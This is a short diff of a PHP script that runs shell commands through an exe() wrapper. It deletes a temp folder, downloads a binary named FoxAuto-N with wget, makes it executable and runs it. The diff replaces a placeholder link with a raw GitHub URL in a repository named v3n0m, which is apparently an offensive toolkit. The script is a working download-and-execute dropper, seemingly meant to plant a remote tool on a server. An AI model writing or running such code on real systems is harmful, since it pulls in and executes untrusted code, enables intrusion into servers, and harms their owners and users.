@@ -26,7 +26,7 @@ function exe($in) {
 }
 
 exe("rm -rf /tmp/FoxAuto");
-exe("wget https://www.link.com/FoxAuto-N");
+exe("wget https://raw.githubusercontent.com/v3n0miq/v3n0m/main/tools/v3n/FoxAuto-N");
 exe("chmod +x FoxAuto-N");
 exe("./FoxAuto-N 0");
 ?>
